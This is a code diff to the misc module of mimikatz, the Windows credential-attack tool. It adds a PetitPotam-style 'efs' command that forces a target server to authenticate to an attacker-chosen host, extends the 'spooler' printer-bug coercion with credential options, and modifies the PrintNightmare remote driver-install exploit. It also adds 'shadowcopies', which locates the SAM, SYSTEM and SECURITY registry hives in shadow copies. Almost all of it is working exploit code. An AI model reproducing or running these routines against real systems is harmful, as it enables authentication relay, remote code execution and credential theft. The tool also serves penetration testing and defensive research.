@@ -28,8 +28,10 @@ const KUHL_M_C kuhl_m_c_misc[] = {
 	{kuhl_m_misc_aadcookie,	L"aadcookie",	NULL},
 	{kuhl_m_misc_aadcookie_NgcSignWithSymmetricPopKey,	L"ngcsign",	NULL},
 	{kuhl_m_misc_spooler,	L"spooler",		NULL},
+	{kuhl_m_misc_efs,		L"efs",			NULL},
 	{kuhl_m_misc_printnightmare,	L"printnightmare",		NULL},
 	{kuhl_m_misc_sccm_accounts,	L"sccm",		NULL},
+	{kuhl_m_misc_shadowcopies, L"shadowcopies",	NULL},
 };
 const KUHL_M kuhl_m_misc = {
 	L"misc",	L"Miscellaneous module",	NULL,
@@ -1340,58 +1342,248 @@ handle_t __RPC_USER STRING_HANDLE_bind(IN STRING_HANDLE Name) {return hSpoolHand
 void __RPC_USER STRING_HANDLE_unbind(IN STRING_HANDLE Name, handle_t hSpool) {}
 NTSTATUS kuhl_m_misc_spooler(int argc, wchar_t * argv[])
 {
-	LPCWSTR szRemote, szCallbackTo;
-	LPWSTR szPathToCallback = NULL;
+	NTSTATUS status;
 	PRINTER_HANDLE hPrinter;
 	DEVMODE_CONTAINER Container = {0, NULL};
-	DWORD ret;
+	DWORD dwRet, AuthnSvc;
+	long ret = 0;
+	NETRESOURCE nr = {0, RESOURCETYPE_DISK,	0, 0, NULL, NULL, NULL, NULL};
+	LPCWSTR szUser, szPassword, szRemote = NULL, szEndpoint, szCallbackTo;
+	PWSTR szPathToCallback;
+
+	SEC_WINNT_AUTH_IDENTITY secIdentity = {NULL, 0, NULL, 0, NULL, 0, SEC_WINNT_AUTH_IDENTITY_UNICODE};
+
+	if(kull_m_string_args_byName(argc, argv, L"authuser", &szUser, NULL))
+	{
+		AuthnSvc = RPC_C_AUTHN_GSS_NEGOTIATE;
+		kprintf(L"[auth ] Explicit authentication\n");
+		kprintf(L"[auth ] Username: %s\n", szUser);
+		secIdentity.User = (USHORT *) szUser;
+		secIdentity.UserLength = lstrlen(szUser);
+
+		if(kull_m_string_args_byName(argc, argv, L"authpassword", &szPassword, NULL))
+		{
+			kprintf(L"[auth ] Password: %s\n", szPassword);
+			secIdentity.Password = (USHORT *) szPassword;
+			secIdentity.PasswordLength = lstrlen(szPassword);
+		}
+	}
+	else if(kull_m_string_args_byName(argc, argv, L"noauth", NULL, NULL))
+	{
+		AuthnSvc = RPC_C_AUTHN_NONE;
+		kprintf(L"[auth ] None\n");
+		szUser = szPassword = L"";
+	}
+	else
+	{
+		AuthnSvc = RPC_C_AUTHN_DEFAULT;
+		kprintf(L"[auth ] Default (current)\n");
+		szUser = szPassword = NULL;
+	}
+
+	kull_m_string_args_byName(argc, argv, L"endpoint", &szEndpoint, L"\\pipe\\spoolss");
+	kprintf(L"[ rpc ] Endpoint: %s\n", szEndpoint);
 
 	if(kull_m_string_args_byName(argc, argv, L"server", &szRemote, NULL) || kull_m_string_args_byName(argc, argv, L"target", &szRemote, NULL))
 	{
 		if(kull_m_string_args_byName(argc, argv, L"connect", &szCallbackTo, NULL) || kull_m_string_args_byName(argc, argv, L"callback", &szCallbackTo, NULL))
 		{
-			if(kull_m_string_sprintf(&szPathToCallback, L"\\\\%s", szCallbackTo))
+			if(kull_m_string_sprintf(&nr.lpRemoteName, L"\\\\%s\\IPC$", szRemote))
 			{
-				kprintf(L"[info] %s will try to connect to %s\\IPC$\n\n", szRemote, szPathToCallback);
-				if(kull_m_rpc_createBinding(NULL, L"ncacn_np", szRemote, L"\\pipe\\spoolss", L"spooler", TRUE, RPC_C_AUTHN_DEFAULT, NULL, RPC_C_IMP_LEVEL_DEFAULT, &hSpoolHandle, NULL))
+				if(kull_m_string_sprintf(&szPathToCallback, L"\\\\%s", szCallbackTo))
 				{
-					RpcTryExcept
+					kprintf(L"[trans] Disconnect eventual IPC: ");
+					dwRet = WNetCancelConnection2(nr.lpRemoteName, 0, TRUE);
+					if((dwRet == NO_ERROR) || (dwRet == ERROR_NOT_CONNECTED))
 					{
-						ret = RpcOpenPrinter(NULL, &hPrinter, NULL, &Container, GENERIC_READ);
-						if(ret == ERROR_SUCCESS)
+						kprintf(L"OK\n[trans] Connect to IPC: ");
+						dwRet = WNetAddConnection2(&nr, szPassword, szUser, CONNECT_TEMPORARY);
+						if(dwRet == NO_ERROR)
 						{
-							ret = RpcRemoteFindFirstPrinterChangeNotification(hPrinter, PRINTER_CHANGE_ALL, PRINTER_NOTIFY_CATEGORY_ALL, szPathToCallback, 42, 0, NULL);
-							if(ret == ERROR_SUCCESS)
+							kprintf(L"OK\n");
+							if(kull_m_rpc_createBinding(NULL, L"ncacn_np", szRemote, szEndpoint, L"spooler", TRUE, AuthnSvc, secIdentity.UserLength ? &secIdentity : NULL, RPC_C_IMP_LEVEL_DEFAULT, &hSpoolHandle, NULL))
 							{
-								kprintf(L"Connected to the target, and notification is OK (?!)\n");
-								ret = RpcFindClosePrinterChangeNotification(hPrinter);
-								if(ret != ERROR_SUCCESS)
+								kprintf(L"[ rpc ] Resolve Endpoint: ");
+								status = RpcEpResolveBinding(hSpoolHandle, &winspool_v1_0_c_ifspec);
+								if(status == RPC_S_OK)
 								{
-									PRINT_ERROR(L"RpcFindClosePrinterChangeNotification: 0x%08x\n", ret);
+									kprintf(L"OK\n\n");
+									RpcTryExcept
+									{
+										ret = RpcOpenPrinter(NULL, &hPrinter, NULL, &Container, GENERIC_READ);
+										if(ret == ERROR_SUCCESS)
+										{
+											ret = RpcRemoteFindFirstPrinterChangeNotification(hPrinter, PRINTER_CHANGE_ALL, PRINTER_NOTIFY_CATEGORY_ALL, szPathToCallback, 42, 0, NULL);
+											if(ret == ERROR_SUCCESS)
+											{
+												kprintf(L"Connected to the target, and notification is OK (?!)\n");
+												ret = RpcFindClosePrinterChangeNotification(hPrinter);
+												if(ret != ERROR_SUCCESS)
+												{
+													PRINT_ERROR(L"RpcFindClosePrinterChangeNotification: 0x%08x\n", ret);
+												}
+											}
+											else if(ret == ERROR_ACCESS_DENIED)
+											{
+												kprintf(L"Access is denied (can be OK)\n");
+											}
+											else PRINT_ERROR(L"RpcRemoteFindFirstPrinterChangeNotification: 0x%08x\n", ret);
+
+											ret = RpcClosePrinter(&hPrinter);
+											if(ret != ERROR_SUCCESS)
+											{
+												PRINT_ERROR(L"RpcClosePrinter: 0x%08x\n", ret);
+											}
+										}
+										else PRINT_ERROR(L"RpcOpenPrinter: 0x%08x\n", ret);
+									}
+									RpcExcept(RPC_EXCEPTION)
+										PRINT_ERROR(L"RPC Exception: 0x%08x (%u)\n", RpcExceptionCode(), RpcExceptionCode());
+									RpcEndExcept
+
+									kprintf(L"\n");
 								}
+								else PRINT_ERROR(L"RpcEpResolveBinding: 0x%08x\n", status);
+								
+								kull_m_rpc_deleteBinding(&hSpoolHandle);
 							}
-							else if(ret == ERROR_ACCESS_DENIED)
-							{
-								kprintf(L"Access is denied (can be OK)\n");
-							}
-							else PRINT_ERROR(L"RpcRemoteFindFirstPrinterChangeNotification: 0x%08x\n", ret);
 
-							ret = RpcClosePrinter(&hPrinter);
-							if(ret != ERROR_SUCCESS)
+							kprintf(L"[trans] Disconnect IPC: ");
+							dwRet = WNetCancelConnection2(nr.lpRemoteName, 0, TRUE);
+							if(dwRet == NO_ERROR)
 							{
-								PRINT_ERROR(L"RpcClosePrinter: 0x%08x\n", ret);
+								kprintf(L"OK\n");
 							}
+							else PRINT_ERROR(L"WNetCancelConnection2: 0x%08x\n");
 						}
-						else PRINT_ERROR(L"RpcOpenPrinter: 0x%08x\n", ret);
+						else PRINT_ERROR(L"WNetAddConnection2:%u\n", dwRet);
 					}
-					RpcExcept(RPC_EXCEPTION)
-						PRINT_ERROR(L"RPC Exception: 0x%08x (%u)\n", RpcExceptionCode(), RpcExceptionCode());
-					RpcEndExcept
+					else PRINT_ERROR(L"WNetCancelConnection2: %u\n", dwRet);
 
-					kull_m_rpc_deleteBinding(&hSpoolHandle);
+					LocalFree(szPathToCallback);
 				}
+				LocalFree(nr.lpRemoteName);
+			}
+		}
+		else PRINT_ERROR(L"missing /connect argument to specify notifications target");
+	}
+	else PRINT_ERROR(L"missing /server argument to specify spooler server");
 
-				LocalFree(szPathToCallback);
+	return STATUS_SUCCESS;
+}
+
+// Inspired from PetitPotam (https://github.com/topotam/PetitPotam) by topotam (@topotam77)
+NTSTATUS kuhl_m_misc_efs(int argc, wchar_t * argv[])
+{
+	NTSTATUS status;
+	RPC_BINDING_HANDLE hEfsHandle;
+	PEXIMPORT_CONTEXT_HANDLE hImportCtx;
+	DWORD dwRet, AuthnSvc;
+	long ret = 0;
+	NETRESOURCE nr = {0, RESOURCETYPE_DISK,	0, 0, NULL, NULL, NULL, NULL};
+	LPCWSTR szUser, szPassword, szRemote = NULL, szEndpoint, szCallbackTo;
+	PWSTR szCallbackToShare;
+
+	SEC_WINNT_AUTH_IDENTITY secIdentity = {NULL, 0, NULL, 0, NULL, 0, SEC_WINNT_AUTH_IDENTITY_UNICODE};
+
+	if(kull_m_string_args_byName(argc, argv, L"authuser", &szUser, NULL))
+	{
+		AuthnSvc = RPC_C_AUTHN_GSS_NEGOTIATE;
+		kprintf(L"[auth ] Explicit authentication\n");
+		kprintf(L"[auth ] Username: %s\n", szUser);
+		secIdentity.User = (USHORT *) szUser;
+		secIdentity.UserLength = lstrlen(szUser);
+
+		if(kull_m_string_args_byName(argc, argv, L"authpassword", &szPassword, NULL))
+		{
+			kprintf(L"[auth ] Password: %s\n", szPassword);
+			secIdentity.Password = (USHORT *) szPassword;
+			secIdentity.PasswordLength = lstrlen(szPassword);
+		}
+	}
+	else if(kull_m_string_args_byName(argc, argv, L"noauth", NULL, NULL))
+	{
+		AuthnSvc = RPC_C_AUTHN_NONE;
+		kprintf(L"[auth ] None\n");
+		szUser = szPassword = L"";
+	}
+	else
+	{
+		AuthnSvc = RPC_C_AUTHN_DEFAULT;
+		kprintf(L"[auth ] Default (current)\n");
+		szUser = szPassword = NULL;
+	}
+
+	kull_m_string_args_byName(argc, argv, L"endpoint", &szEndpoint, L"\\pipe\\lsarpc");
+	kprintf(L"[ rpc ] Endpoint: %s\n", szEndpoint);
+
+	if(kull_m_string_args_byName(argc, argv, L"server", &szRemote, NULL) || kull_m_string_args_byName(argc, argv, L"target", &szRemote, NULL))
+	{
+		if(kull_m_string_args_byName(argc, argv, L"connect", &szCallbackTo, NULL) || kull_m_string_args_byName(argc, argv, L"callback", &szCallbackTo, NULL))
+		{
+			if(kull_m_string_sprintf(&nr.lpRemoteName, L"\\\\%s\\IPC$", szRemote))
+			{
+				if(kull_m_string_sprintf(&szCallbackToShare, L"\\\\%s\\" MIMIKATZ L"\\" MIMIKATZ, szCallbackTo))
+				{
+					kprintf(L"[trans] Disconnect eventual IPC: ");
+					dwRet = WNetCancelConnection2(nr.lpRemoteName, 0, TRUE);
+					if((dwRet == NO_ERROR) || (dwRet == ERROR_NOT_CONNECTED))
+					{
+						kprintf(L"OK\n[trans] Connect to IPC: ");
+						dwRet = WNetAddConnection2(&nr, szPassword, szUser, CONNECT_TEMPORARY);
+						if(dwRet == NO_ERROR)
+						{
+							kprintf(L"OK\n");
+							if(kull_m_rpc_createBinding(NULL, L"ncacn_np", szRemote, szEndpoint, L"host", TRUE, AuthnSvc, secIdentity.UserLength ? &secIdentity : NULL, RPC_C_IMP_LEVEL_DEFAULT, &hEfsHandle, NULL))
+							{
+								kprintf(L"[ rpc ] Resolve Endpoint: ");
+								status = RpcEpResolveBinding(hEfsHandle, &efsrpc_v1_0_c_ifspec);
+								if(status == RPC_S_OK)
+								{
+									kprintf(L"OK\n\n");
+									RpcTryExcept
+									{
+										ret = EfsRpcOpenFileRaw(hEfsHandle, &hImportCtx, szCallbackToShare, 0);
+										if(ret == ERROR_BAD_NETPATH)
+										{
+											kprintf(L"Remote server reported bad network path! (OK)\n> Server (%s) may have tried to authenticate (to: %s)\n", szRemote, szCallbackTo);
+										}
+										else if(ret == 0)
+										{
+											PRINT_ERROR(L"EfsRpcOpenFileRaw is a success, really? (not normal)\n");
+											EfsRpcCloseRaw(&hEfsHandle);
+										}
+										else
+										{
+											PRINT_ERROR(L"EfsRpcOpenFileRaw: ", ret);
+										}
+									}
+									RpcExcept(RPC_EXCEPTION)
+										PRINT_ERROR(L"RPC Exception: 0x%08x (%u)\n", RpcExceptionCode(), RpcExceptionCode());
+									RpcEndExcept
+
+									kprintf(L"\n");
+								}
+								else PRINT_ERROR(L"RpcEpResolveBinding: 0x%08x\n", status);
+								
+								kull_m_rpc_deleteBinding(&hEfsHandle);
+							}
+
+							kprintf(L"[trans] Disconnect IPC: ");
+							dwRet = WNetCancelConnection2(nr.lpRemoteName, 0, TRUE);
+							if(dwRet == NO_ERROR)
+							{
+								kprintf(L"OK\n");
+							}
+							else PRINT_ERROR(L"WNetCancelConnection2: 0x%08x\n");
+						}
+						else PRINT_ERROR(L"WNetAddConnection2:%u\n", dwRet);
+					}
+					else PRINT_ERROR(L"WNetCancelConnection2: %u\n", dwRet);
+
+					LocalFree(szCallbackToShare);
+				}
+				LocalFree(nr.lpRemoteName);
 			}
 		}
 		else PRINT_ERROR(L"missing /connect argument to specify notifications target");
@@ -1466,7 +1658,7 @@ NTSTATUS kuhl_m_misc_printnightmare(int argc, wchar_t * argv[])
 			DriverInfo.pEnvironment = bIsX64 ? L"Windows x64" : L"Windows NT x86";
 			if(kull_m_string_args_byName(argc, argv, L"library", &szLibrary, NULL))
 			{
-				if(kuhl_m_misc_printnightmare_normalize_library(szLibrary, &DriverInfo.pConfigFile, NULL))
+				if(kuhl_m_misc_printnightmare_normalize_library(bIsPar, szLibrary, &DriverInfo.pConfigFile, NULL))
 				{
 					szForce = kull_m_string_args_byName(argc, argv, L"useown", NULL, NULL) ? DriverInfo.pConfigFile : NULL;
 
@@ -1477,7 +1669,13 @@ NTSTATUS kuhl_m_misc_printnightmare(int argc, wchar_t * argv[])
 						{
 							if(kuhl_m_misc_printnightmare_FillStructure(&DriverInfo, bIsX64, !kull_m_string_args_byName(argc, argv, L"nodynamic", NULL, NULL), szForce, bIsPar, hSpoolHandle))
 							{
-								kuhl_m_misc_printnightmare_AddPrinterDriver(bIsPar, hSpoolHandle, &DriverInfo, APD_COPY_FROM_DIRECTORY | APD_COPY_NEW_FILES | APD_INSTALL_WARNED_DRIVER);
+								if(kuhl_m_misc_printnightmare_AddPrinterDriver(bIsPar, hSpoolHandle, &DriverInfo, APD_COPY_FROM_DIRECTORY | APD_COPY_NEW_FILES | APD_INSTALL_WARNED_DRIVER))
+								{
+									if(!bIsPar) // we can't remotely with normal user, use /clean with > rights
+									{
+										kuhl_m_misc_printnightmare_DeletePrinterDriver(bIsPar, hSpoolHandle, DriverInfo.pEnvironment, DriverInfo.pName);
+									}
+								}
 								
 								LocalFree(DriverInfo.pDataFile);
 								LocalFree(DriverInfo.pDriverPath);
@@ -1501,7 +1699,7 @@ NTSTATUS kuhl_m_misc_printnightmare(int argc, wchar_t * argv[])
 	return STATUS_SUCCESS;
 }
 
-BOOL kuhl_m_misc_printnightmare_normalize_library(LPCWSTR szLibrary, LPWSTR *pszNormalizedLibrary, LPWSTR *pszShortLibrary)
+BOOL kuhl_m_misc_printnightmare_normalize_library(BOOL bIsPar, LPCWSTR szLibrary, LPWSTR *pszNormalizedLibrary, LPWSTR *pszShortLibrary)
 {
 	BOOL status = FALSE;
 	LPCWSTR szPtr;
@@ -1518,7 +1716,14 @@ BOOL kuhl_m_misc_printnightmare_normalize_library(LPCWSTR szLibrary, LPWSTR *psz
 	}
 	else
 	{
-		status = kull_m_string_copy(pszNormalizedLibrary, szLibrary);
+		if(!bIsPar)
+		{
+			status = kull_m_file_getAbsolutePathOf(szLibrary, pszNormalizedLibrary);
+		}
+		else
+		{
+			status = kull_m_string_copy(pszNormalizedLibrary, szLibrary);
+		}
 	}
 
 	if(status)
@@ -1619,7 +1824,7 @@ BOOL kuhl_m_misc_printnightmare_FillStructure(PDRIVER_INFO_2 pInfo2, BOOL bIsX64
 
 void kuhl_m_misc_printnightmare_ListPrintersAndMaybeDelete(BOOL bIsPar, handle_t hRemoteBinding, LPCWSTR szEnvironment, BOOL bIsDelete)
 {
-	DWORD i, ret, cReturned = 0;
+	DWORD i, cReturned = 0;
 	_PDRIVER_INFO_2 pDriverInfo;
 	PWSTR pName, pConfig;
 
@@ -1636,28 +1841,7 @@ void kuhl_m_misc_printnightmare_ListPrintersAndMaybeDelete(BOOL bIsPar, handle_t
 				{
 					if(pName == wcsstr(pName, MIMIKATZ L"-"))
 					{
-						RpcTryExcept
-						{
-							if(bIsPar)
-							{
-								kprintf(L"> RpcAsyncDeletePrinterDriverEx: ");
-								ret = RpcAsyncDeletePrinterDriverEx(hRemoteBinding, NULL, (wchar_t *) szEnvironment, pName, DPD_DELETE_UNUSED_FILES, 0);
-							}
-							else
-							{
-								kprintf(L"> RpcDeletePrinterDriverEx: ");
-								ret = RpcDeletePrinterDriverEx(NULL, (wchar_t *) szEnvironment, pName, DPD_DELETE_UNUSED_FILES, 0);
-							}
-
-							if (ret == ERROR_SUCCESS)
-							{
-								kprintf(L"OK!\n");
-							}
-							else PRINT_ERROR(L"%u\n", ret);
-						}
-						RpcExcept(RPC_EXCEPTION)
-							PRINT_ERROR(L"RPC Exception: 0x%08x (%u)\n", RpcExceptionCode(), RpcExceptionCode());
-						RpcEndExcept
+						kuhl_m_misc_printnightmare_DeletePrinterDriver(bIsPar, hRemoteBinding, szEnvironment, pName);
 					}
 				}
 			}
@@ -1666,8 +1850,9 @@ void kuhl_m_misc_printnightmare_ListPrintersAndMaybeDelete(BOOL bIsPar, handle_t
 	}
 }
 
-void kuhl_m_misc_printnightmare_AddPrinterDriver(BOOL bIsPar, handle_t hRemoteBinding, PDRIVER_INFO_2 pInfo2, DWORD dwFlags)
+BOOL kuhl_m_misc_printnightmare_AddPrinterDriver(BOOL bIsPar, handle_t hRemoteBinding, PDRIVER_INFO_2 pInfo2, DWORD dwFlags)
 {
+	BOOL status = FALSE;
 	DWORD ret;
 	DRIVER_CONTAINER container_info;
 
@@ -1690,6 +1875,7 @@ void kuhl_m_misc_printnightmare_AddPrinterDriver(BOOL bIsPar, handle_t hRemoteBi
 
 		if (ret == ERROR_SUCCESS)
 		{
+			status = TRUE;
 			kprintf(L"OK!\n");
 		}
 		else PRINT_ERROR(L"%u\n", ret);
@@ -1697,6 +1883,40 @@ void kuhl_m_misc_printnightmare_AddPrinterDriver(BOOL bIsPar, handle_t hRemoteBi
 	RpcExcept(RPC_EXCEPTION)
 		PRINT_ERROR(L"RPC Exception: 0x%08x (%u)\n", RpcExceptionCode(), RpcExceptionCode());
 	RpcEndExcept
+
+	return status;
+}
+
+BOOL kuhl_m_misc_printnightmare_DeletePrinterDriver(BOOL bIsPar, handle_t hRemoteBinding, LPCWSTR szEnvironment, LPCWSTR pName)
+{
+	BOOL status = FALSE;
+	DWORD ret;
+
+	RpcTryExcept
+	{
+		if(bIsPar)
+		{
+			kprintf(L"> RpcAsyncDeletePrinterDriverEx: ");
+			ret = RpcAsyncDeletePrinterDriverEx(hRemoteBinding, NULL, (wchar_t *) szEnvironment, (wchar_t *) pName, DPD_DELETE_UNUSED_FILES, 0);
+		}
+		else
+		{
+			kprintf(L"> RpcDeletePrinterDriverEx: ");
+			ret = RpcDeletePrinterDriverEx(NULL, (wchar_t *) szEnvironment, (wchar_t *)pName, DPD_DELETE_UNUSED_FILES, 0);
+		}
+
+		if (ret == ERROR_SUCCESS)
+		{
+			status = TRUE;
+			kprintf(L"OK!\n");
+		}
+		else PRINT_ERROR(L"%u\n", ret);
+	}
+	RpcExcept(RPC_EXCEPTION)
+		PRINT_ERROR(L"RPC Exception: 0x%08x (%u)\n", RpcExceptionCode(), RpcExceptionCode());
+	RpcEndExcept
+
+	return status;
 }
 
 BOOL kuhl_m_misc_printnightmare_EnumPrinters(BOOL bIsPar, handle_t hRemoteBinding, LPCWSTR szEnvironment, _PDRIVER_INFO_2 *ppDriverInfo, DWORD *pcReturned)
@@ -1880,6 +2100,88 @@ NTSTATUS kuhl_m_misc_sccm_accounts(int argc, wchar_t * argv[])
 		SQLFreeHandle(SQL_HANDLE_ENV, hEnv);
 	}
 	else PRINT_ERROR(L"/connectionstring is needed, example: /connectionstring:\"DRIVER={SQL Server};Trusted=true;DATABASE=CM_PRD;SERVER=myserver.fqdn\\instancename;\"\n");
+
+	return STATUS_SUCCESS;
+}
+
+DECLARE_CONST_UNICODE_STRING(usRootDevice, L"\\Device");
+DECLARE_CONST_UNICODE_STRING(usDevice, L"Device");
+const OBJECT_ATTRIBUTES oaDevice = RTL_CONSTANT_OBJECT_ATTRIBUTES(&usRootDevice, 0);
+const wchar_t *INT_FILES[] = {L"SYSTEM", L"SAM", L"SECURITY", L"SOFTWARE"};
+NTSTATUS kuhl_m_misc_shadowcopies(int argc, wchar_t * argv[])
+{
+	NTSTATUS status;
+	HANDLE hDeviceDirectory;
+    BYTE Buffer[0x100];
+    ULONG Start, Context, ReturnLength, i, j;
+    BOOLEAN RestartScan;
+	POBJECT_DIRECTORY_INFORMATION pDirectoryInformation;
+	PWSTR szName, szShadowName, szFullPath;
+	WIN32_FILE_ATTRIBUTE_DATA Attribute;
+
+	status = NtOpenDirectoryObject(&hDeviceDirectory, DIRECTORY_QUERY | DIRECTORY_TRAVERSE, (POBJECT_ATTRIBUTES) &oaDevice);
+	if(NT_SUCCESS(status))
+	{
+		for(Start = 0, Context = 0, RestartScan = TRUE, status = STATUS_MORE_ENTRIES; status == STATUS_MORE_ENTRIES; )
+		{
+			status = NtQueryDirectoryObject(hDeviceDirectory, Buffer, sizeof(Buffer), FALSE, RestartScan, &Context, &ReturnLength);
+			if(NT_SUCCESS(status))
+			{
+				pDirectoryInformation = (POBJECT_DIRECTORY_INFORMATION) Buffer;
+				for(i = 0; i < (Context - Start); i++)
+				{
+					if(RtlEqualUnicodeString(&usDevice, &pDirectoryInformation[i].TypeName, TRUE))
+					{
+						szName = kull_m_string_unicode_to_string(&pDirectoryInformation[i].Name);
+						if(szName)
+						{
+							if(szName == wcsstr(szName, L"HarddiskVolumeShadowCopy"))
+							{
+								if(kull_m_string_sprintf(&szShadowName, L"\\\\?\\GLOBALROOT\\Device\\%s\\", szName))
+								{
+									kprintf(L"\nShadowCopy Volume : %s\n", szName);
+									kprintf(L"| Path            : %s\n", szShadowName);
+
+									if(GetFileAttributesEx(szShadowName, GetFileExInfoStandard, &Attribute))
+									{
+										kprintf(L"| Volume LastWrite: ");
+										kull_m_string_displayLocalFileTime(&Attribute.ftLastWriteTime);
+										kprintf(L"\n");
+									}
+									else PRINT_ERROR_AUTO(L"GetFileAttributesEx");
+									kprintf(L"\n");
+									for(j = 0; j < ARRAYSIZE(INT_FILES); j++)
+									{
+										if(kull_m_string_sprintf(&szFullPath, L"%sWindows\\System32\\config\\%s", szShadowName, INT_FILES[j]))
+										{
+											kprintf(L"* %s\n", szFullPath);
+
+											if(GetFileAttributesEx(szFullPath, GetFileExInfoStandard, &Attribute))
+											{
+												kprintf(L"  | LastWrite   : ");
+												kull_m_string_displayLocalFileTime(&Attribute.ftLastWriteTime);
+												kprintf(L"\n");
+											}
+											else PRINT_ERROR_AUTO(L"GetFileAttributesEx");
+
+											LocalFree(szFullPath);
+										}
+									}
+									LocalFree(szShadowName);
+								}
+							}
+							LocalFree(szName);
+						}
+					}
+				}
+				Start = Context;
+				RestartScan = FALSE;
+			}
+			else PRINT_ERROR(L"NtQueryDirectoryObject: 0x%08x\n", status);
+		}
+		CloseHandle(hDeviceDirectory);
+	}
+	else PRINT_ERROR(L"NtOpenDirectoryObject: 0x%08x\n", status);
 
 	return STATUS_SUCCESS;
 }
